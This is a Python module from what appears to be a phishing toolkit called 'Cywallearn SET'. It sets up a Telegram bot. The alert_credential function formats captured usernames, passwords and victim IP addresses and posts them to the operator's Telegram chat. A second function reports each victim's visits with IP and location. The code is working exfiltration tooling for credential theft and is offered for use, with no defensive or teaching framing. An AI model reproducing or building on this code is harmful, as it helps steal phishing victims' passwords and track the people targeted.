"""Cywallearn SET - Real-time Telegram Alerts"""

import os
import sys
import requests
from datetime import datetime

sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', '..'))
from core.config import Config

class TelegramAlerts:
    def __init__(self):
        self.bot_token = Config.load('telegram_token', '')
        self.chat_id = Config.load('telegram_chat_id', '')
    
    def configure(self):
        """Setup Telegram bot"""
        print("\n=== Telegram Alert Configuration ===")
        print("1. Create a bot at @BotFather on Telegram")
        print("2. Get your bot token")
        print("3. Get your chat ID (use @userinfobot)")
        
        self.bot_token = input("\nBot Token: ").strip()
        self.chat_id = input("Chat ID: ").strip()
        
        Config.save('telegram_token', self.bot_token)
        Config.save('telegram_chat_id', self.chat_id)
        
        # Test
        if self.send("✅ Cywallearn SET alert system connected!"):
            print("[+] Telegram configured and tested!")
        else:
            print("[!] Test failed. Check your token and chat ID.")
    
    def send(self, message):
        """Send message to Telegram"""
        if not self.bot_token or not self.chat_id:
            return False
        
        try:
            url = f"https://api.telegram.org/bot{self.bot_token}/sendMessage"
            data = {
                'chat_id': self.chat_id,
                'text': message,
                'parse_mode': 'HTML'
            }
            resp = requests.post(url, data=data, timeout=10)
            return resp.json().get('ok', False)
        except:
            return False
    
    def alert_credential(self, service, username, password, ip):
        """Alert on credential capture"""
        msg = f"""<b>🔴 CREDENTIAL CAPTURED</b>
<b>Service:</b> {service}
<b>Username:</b> <code>{username}</code>
<b>Password:</b> <code>{password}</code>
<b>IP:</b> {ip}
<b>Time:</b> {datetime.now().strftime('%H:%M:%S')}"""
        return self.send(msg)
    
    def alert_visit(self, ip, country, page):
        """Alert on new visit"""
        msg = f"""<b>👁 New Visit</b>
<b>IP:</b> {ip}
<b>Location:</b> {country}
<b>Page:</b> {page}
<b>Time:</b> {datetime.now().strftime('%H:%M:%S')}"""
        return self.send(msg)